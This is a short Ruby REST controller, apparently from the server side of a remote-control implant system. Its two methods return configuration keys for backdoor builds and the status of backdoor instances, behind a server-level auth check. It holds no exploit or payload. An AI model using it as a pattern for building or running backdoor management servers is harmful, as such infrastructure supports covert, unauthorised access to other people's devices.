#
# Controller for the Backdoor objects
#

module RCS
module DB

class BackdoorController < RESTController

  # retrieve the class key of the backdoors
  # if the parameter is specified, it take only that class
  # otherwise, return all the keys for all the classes
  def class_keys
    require_auth_level :server

    classes = {}

    if params[:backdoor] then
      DB.backdoor_class_key(params[:backdoor]).each do |entry|
          classes[entry[:build]] = entry[:confkey]
        end
    else
      DB.backdoor_class_keys.each do |entry|
          classes[entry[:build]] = entry[:confkey]
        end
    end

    return STATUS_OK, *json_reply(classes)
  end

  # retrieve the status of a backdoor instance.
  def status
    require_auth_level :server
    
    request = JSON.parse(params[:backdoor])

    status = DB.backdoor_status(request['build_id'], request['instance_id'], request['subtype'])

    # if it does not exist
    status ||= {}
    
    #TODO: all the backdoor.identify stuff...

    return STATUS_OK, *json_reply(status)
  end

end

end #DB::
end #RCS::
